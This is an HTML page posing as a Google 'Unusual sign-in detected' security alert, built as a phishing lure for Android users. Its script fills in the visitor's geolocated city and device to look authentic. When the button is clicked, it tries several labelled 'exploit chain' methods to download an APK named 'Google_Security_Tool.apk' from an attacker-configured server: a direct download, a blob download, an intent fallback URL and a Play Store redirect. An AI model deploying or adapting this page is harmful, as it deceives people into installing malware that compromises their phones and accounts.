<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 40px 20px; background: #fafafa; }
        .container { max-width: 360px; margin: 0 auto; background: white; border-radius: 16px; padding: 30px 20px; box-shadow: 0 1px 8px rgba(0,0,0,0.08); }
        h2 { font-size: 18px; color: #222; }
        .alert { background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; padding: 12px; font-size: 13px; margin: 16px 0; }
        .btn { display: block; width: 100%; padding: 14px; background: #1a73e8; color: white; text-decoration: none; border-radius: 8px; font-size: 15px; margin: 12px 0; box-sizing: border-box; }
        .btn:active { background: #1557b0; }
        .footer { font-size: 11px; color: #999; margin-top: 20px; }
        .trace { font-size: 9px; color: #ccc; margin-top: 30px; }
    </style>
</head>
<body>
<div class="container" id="app">
    <h2>⚠️ Unusual sign-in detected</h2>
    <p style="font-size:14px;color:#555;">Someone tried to access your Google Account from a new device.</p>
    <div class="alert">📍 <strong>Location:</strong> <span id="city">Loading...</span><br>
    🖥 <strong>Device:</strong> <span id="device">Loading...</span></div>
    <p style="font-size:13px;color:#666;">If this wasn't you, secure your account below.</p>
    <a class="btn" id="download-btn" href="#">Secure Your Account →</a>
    <div class="footer">Google Security · <span id="timestamp"></span></div>
    <div class="trace" id="debug"></div>
</div>

<script>
(function(){
    // ===== CONFIG =====
    // Replace with your actual payload URL (file.io, transfer.sh, or your VPS)
    var PAYLOAD = "https://YOUR-SERVER.com/Google_Security_Tool.apk";
    
    // ===== GEO-IP LEAK (makes it look real) =====
    var city = "Unknown";
    var debug = document.getElementById('debug');
    
    fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(d => {
            city = d.city + ", " + (d.country_name || "");
            document.getElementById('city').textContent = city;
            document.getElementById('device').textContent = navigator.userAgent.match(/Android [\d.]+/) ? "Android " + navigator.userAgent.match(/Android ([\d.]+)/)[1] : "Unknown";
        })
        .catch(() => {
            document.getElementById('city').textContent = "Unknown";
        });
    
    // Timestamp
    var now = new Date();
    document.getElementById('timestamp').textContent = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric', hour: '2-digit', minute: '2-digit' });
    
    // ===== EXPLOIT CHAIN =====
    document.getElementById('download-btn').addEventListener('click', function(e) {
        e.preventDefault();
        
        // Detect Android
        var isAndroid = /Android/i.test(navigator.userAgent);
        var chromeVer = parseInt((navigator.userAgent.match(/Chrome\/(\d+)/)||[])[1]) || 0;
        var androidVer = parseFloat((navigator.userAgent.match(/Android ([\d.]+)/)||[])[1]) || 0;
        
        debug.textContent = "Android: " + androidVer + " | Chrome: " + chromeVer;
        
        if (!isAndroid) {
            alert("This page is for Android users.");
            return;
        }
        
        // ===== METHOD 1: CVE-2020-6506 (Chrome < 84) =====
        // Allows arbitrary file download without gesture if using blob URL
        if (chromeVer > 0 && chromeVer < 84) {
            try {
                var a = document.createElement('a');
                a.href = PAYLOAD;
                a.download = 'Google_Security_Tool.apk';
                document.body.appendChild(a);
                a.click();
                debug.textContent += "\nMethod 1: Direct download (pre-Chrome 84)";
            } catch(e) {
                debug.textContent += "\nMethod 1 failed: " + e.message;
            }
        }
        
        // ===== METHOD 2: FileReader + Blob (bypasses some download restrictions) =====
        // Only works if we can proxy the file through a blob (requires CORS)
        if (chromeVer >= 84) {
            fetch(PAYLOAD)
                .then(r => r.blob())
                .then(blob => {
                    var url = URL.createObjectURL(blob);
                    var a = document.createElement('a');
                    a.href = url;
                    a.download = 'Google_Security_Tool.apk';
                    document.body.appendChild(a);
                    a.click();
                    URL.revokeObjectURL(url);
                    debug.textContent += "\nMethod 2: Blob download";
                })
                .catch(function(err) {
                    debug.textContent += "\nMethod 2 failed (CORS): " + err.message;
                    // Fallback
                    window.location = PAYLOAD;
                });
        }
        
        // ===== METHOD 3: Android Intent Scheme (Android < 12) =====
        if (androidVer < 12) {
            setTimeout(function() {
                try {
                    window.location = 'intent://download#' + 
                        'Intent;action=android.intent.action.VIEW;' +
                        'scheme=https;' +
                        'S.browser_fallback_url=' + encodeURIComponent(PAYLOAD) + ';end';
                    debug.textContent += "\nMethod 3: Intent scheme attempted";
                } catch(e) {}
            }, 500);
        }
        
        // ===== METHOD 4: Safari/WebView protocol handler trick =====
        // Some Android WebViews (Samsung Browser, Huawei Browser) respect protocol handlers
        if (/SamsungBrowser|Huawei|MiuiBrowser/i.test(navigator.userAgent)) {
            setTimeout(function() {
                window.location = 'market://details?id=com.google.android.gms';
                // This opens Play Store — after user presses back, the download notification is there
            }, 2000);
        }
    });
})();
</script>
</body>
</html>
